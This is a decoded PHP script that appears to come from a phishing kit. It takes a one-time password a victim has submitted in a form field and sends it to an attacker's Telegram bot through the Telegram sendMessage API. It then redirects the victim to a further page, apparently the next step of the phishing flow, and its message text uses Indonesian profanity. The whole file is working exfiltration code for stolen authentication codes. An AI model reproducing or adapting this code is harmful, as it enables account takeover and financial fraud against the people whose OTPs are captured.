/* Decoded by unphp.net */

?>b'<?php
include "portalbot.php";
session_start();

$bacot2 = $_POST[\'bacot2\'];

$message = "

â â¤  Code OTP Nya Jancuk : ".$bacot2."
 ";
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header(\'Location: otpkontol.php\');
?>
'